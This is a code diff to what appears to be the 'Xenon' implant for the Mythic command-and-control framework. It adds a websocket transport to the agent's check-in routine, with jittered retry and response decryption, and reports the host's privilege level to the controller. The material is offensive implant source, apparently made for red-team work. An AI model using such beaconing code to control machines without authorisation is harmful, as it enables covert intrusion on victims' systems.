@@ -1,9 +1,14 @@
 #include "Xenon.h"
 #include "Checkin.h"
 #include "Task.h"
+#include "Identity.h"
 
 #include "TransportSmb.h"
 #include "TransportTcp.h"
+#include "TransportWebsocket.h"
+#include "Package.h"
+#include "Parser.h"
+#include "Sleep.h"
 
 #include <lm.h>
 #include <lmwksta.h>
@@ -170,6 +175,7 @@ BOOL CheckinSend()
         Process Name
         Size ExternIP
         Extern IP
+        Integrity Level (BYTE: 0-4 Mythic integrity_level)
     */
 
     
@@ -241,6 +247,9 @@ BOOL CheckinSend()
     // External IP 
     PackageAddString(CheckinData, (PCHAR) "1.1.1.1", TRUE);    // TODO
 
+    // Integrity level (Mythic: 1 low, 2 medium, 3 high, 4 SYSTEM; >2 = elevated UI)
+    PackageAddByte(CheckinData, IdentityGetIntegrityLevel());
+
     /* Free some allocations */
     LocalFree(tableOfIPs);
 
@@ -300,6 +309,43 @@ BOOL CheckinSend()
     }
 
     ParserNew(&Output, pOutData, OutLen);
+
+    ParserDecrypt(&Output);
+
+#endif
+
+#ifdef WEBSOCKET_TRANSPORT
+
+    PBYTE  pOutData = NULL;
+    SIZE_T OutLen   = 0;
+
+    PackageSend(CheckinData, NULL);
+
+    _dbg("[WS] Waiting for checkin response...");
+
+    while ( pOutData == NULL || OutLen == 0 )
+    {
+        if ( !WebsocketIsConnected() )
+        {
+            _err("[WS] Disconnected while waiting for checkin");
+            SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
+            PackageSend(CheckinData, NULL);
+            continue;
+        }
+
+        WebsocketWaitInbound(5000);
+
+        if ( WebsocketReceive(&pOutData, &OutLen) )
+            break;
+    }
+
+    ParserNew(&Output, pOutData, OutLen);
+
+    if ( pOutData )
+    {
+        LocalFree(pOutData);
+        pOutData = NULL;
+    }
 
     ParserDecrypt(&Output);
 
